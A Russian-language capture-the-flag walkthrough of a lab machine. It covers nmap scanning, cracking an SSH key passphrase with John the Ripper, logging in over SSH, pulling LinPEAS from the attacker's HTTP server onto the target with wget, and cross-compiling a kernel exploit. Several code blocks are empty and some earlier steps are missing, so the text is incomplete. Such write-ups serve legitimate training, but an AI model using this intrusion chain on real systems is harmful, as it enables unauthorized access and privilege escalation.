### Сканирование портов

Начнём со сканирования целевого хоста утилитой `nmap` для определения открытых портов и запущенных сервисов.

```bash
nmap -sC -sV 10.113.158.17
```

**Описание команды и флагов:**
- `nmap` — мощный инструмент для исследования сети и аудита безопасности.
- `10.113.158.17` — IP-адрес целевой машины.
- `-sC` — запускает скрипты из категории по умолчанию (`default`). Эти скрипты выполняют базовые проверки безопасности, сбор информации о сервисах и пр., не являясь при этом слишком агрессивными.
- `-sV` — определяет версии сервисов, запущенных на открытых портах. Пытается получить баннеры сервисов и сопоставить их с базой сигнатур для точного определения имени приложения и его версии.

### Расшифровка RSA-ключа

Теперь, имея на руках зашифрованный приватный ключ и словарь паролей, можно попытаться подобрать парольную фразу. Сначала скачиваем ключ на локальную машину:

```bash
wget http://10.113.158.17/secret/secretKey
```

Далее копируем содержимое `dict.lst` в локальный файл `password.txt` вручную через `nano` или `vim`:

```bash
nano password.txt
```

Убеждаемся, что словарь сохранён корректно:

```bash
cat password.txt
```

Теперь необходимо перевести приватный ключ в формат, пригодный для взлома в утилите `John the Ripper`. Для SSH-ключей существует специальный скрипт `ssh2john`, который извлекает хеш из ключа:

```bash
ssh2john secretKey > hash
```

**Что делают утилиты:**
- `ssh2john` — утилита из пакета `John the Ripper`, преобразующая зашифрованный SSH-ключ в формат хеша, понятный для `john`. Сохраняем результат в файл `hash`.
- `>` — перенаправление вывода команды в файл (вместо экрана записываем в `hash`).

Запускаем `john` для подбора парольной фразы по словарю:

```bash
john hash --wordlist=password.txt
```

**Описание флагов:**
- `hash` — файл с хешем для взлома.
- `--wordlist=password.txt` — путь к файлу словаря, откуда `john` будет брать кандидатов в пароли.

### Подключение по SSH с использованием ключа

После успешного подбора парольной фразы можно подключиться к серверу по SSH от имени пользователя **john**, используя расшифрованный приватный ключ. Однако сначала необходимо скорректировать права доступа к файлу ключа.

Проверяем текущие права:

```bash
ls -la
```

Видим, что у `secretKey` права `-rw-r--r--` (644) — владелец может читать и записывать, остальные только читать. SSH предъявляет строгие требования к приватным ключам: они не должны быть доступны никому, кроме владельца. При попытке подключения с правами 644 сервер отклонит аутентификацию, выдав ошибку о слишком открытых правах.

Исправляем права на ключ, делая его доступным только для владельца:

```bash
chmod 600 secretKey
```

**Описание команды:**
- `chmod` — утилита для изменения прав доступа к файлам.
- `600` — восьмеричное представление прав, где:
  - `6` — владелец может читать (4) и записывать (2), сумма 6.
  - `0` — группа не имеет никаких прав.
  - `0` — остальные пользователи не имеют никаких прав.

Проверяем, что права изменились — теперь `-rw-------` (600), то есть чтение и запись только у владельца.

Подключаемся к серверу по SSH:

```bash
ssh john@10.113.158.17 -i secretKey
```

**Описание флагов:**
- `john` — имя пользователя, найденное ранее в HTML-комментарии.
- `10.113.158.17` — IP-адрес целевого хоста.
- `-i secretKey` — указание файла приватного ключа для аутентификации (вместо пароля).

После ввода парольной фразы `letmein` успешно входим в систему:

```

...
Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$
```

Мы получили доступ к системе от имени пользователя **john**. Хост называется `exploitable`.

### Поиск векторов повышения привилегий (LinPEAS)

Для автоматического поиска потенциальных путей повышения привилегий на целевой системе используем скрипт **LinPEAS** (Linux Privilege Escalation Awesome Script). Это часть пакета `peass`, который собирает и анализирует информацию о системе: права доступа, SUID-файлы, cron-задачи, уязвимые конфигурации и другие возможные векторы эскалации.

Сначала находим скрипт на локальной машине:

```bash
find / -name "linpeas.sh" 2>/dev/null
```

**Описание команды:**
- `find /` — поиск по всей файловой системе, начиная с корня.
- `-name "linpeas.sh"` — искать файл с точным именем `linpeas.sh`.
- `2>/dev/null` — перенаправление ошибок (stderr) в `/dev/null`, чтобы отсеять сообщения о недоступных директориях и оставить только чистый результат.

Скрипт найден по пути `/usr/share/peass/linpeas/linpeas.sh`. Переходим в эту директорию:

```bash
cd /usr/share/peass/linpeas/
```

Теперь нужно передать скрипт на целевую машину. Для этого на **локальной** машине поднимаем временный HTTP-сервер. Сначала узнаём IP-адрес VPN-интерфейса `tun0` — именно через него идёт связь с целевым хостом:

```bash
ip a
```

В выводе видим интерфейс `tun0` с IP-адресом `192.168.172.138`. Это адрес нашей атакующей машины в сети задания. Поднимаем HTTP-сервер:

```bash
python3 -m http.server 80
```

**Описание команды:**
- `python3 -m http.server` — встроенный модуль Python для запуска простого HTTP-сервера. Он отдаёт файлы из текущей директории по HTTP.
- `80` — порт, на котором будет работать сервер.

Теперь на **целевой** машине скачиваем скрипт с нашей машины по HTTP:

```bash
wget http://192.168.172.138/linpeas.sh
```

**Описание:**
- `192.168.172.138` — IP-адрес атакующей машины (наш `tun0`), доступный с целевого хоста.
- Скрипт скачивается напрямую из директории, где мы запустили HTTP-сервер.

После скачивания даём скрипту права на выполнение:

```bash
chmod +x linpeas.sh
```

**Описание:**
- `chmod +x` — добавляет флаг `executable` (выполняемый) для файла, чтобы его можно было запустить как программу.


### Поиск уязвимостей ядра (CVE)

Запускаем LinPEAS с фильтрацией только по CVE, исключая интерактивные запросы:

```bash
./linpeas.sh -a 2>/dev/null | grep -i "cve"
```

**Описание команды:**
- `-a` — все проверки без brute force.
- `2>/dev/null` — подавление ошибок (stderr).
- `| grep -i "cve"` — фильтрация вывода, оставляем только строки, содержащие "cve" (без учёта регистра).


Устанавливаем кросс-компилятор GCC для x86_64:

```bash

```

**Описание:**
- `gcc-x86-64-linux-gnu` — пакет, предоставляющий компилятор `x86_64-linux-gnu-gcc`, который собирает исполняемые файлы для архитектуры x86_64, даже если хост-система работает на другой архитектуре (в нашем случае ARM64).

```bash

```

**Описание флагов:**
- `x86_64-linux-gnu-gcc` — кросс-компилятор под целевую архитектуру x86_64.
- `exploit.c` — исходный файл.
- `-o exploit` — имя выходного файла.
- `-static` — статическая линковка (включает все библиотеки внутрь бинарника, чтобы не зависеть от версий библиотек на целевой системе).

```bash

```

**Описание:**
- `libc6-dev-amd64-cross` — заголовочные файлы стандартной библиотеки C для кросс-компиляции под x86_64.

Повторяем компиляцию — на этот раз успешно. В директории появляется готовый бинарник `exploit`. Удаляем старый (собранный под ARM64) и видим новый файл.
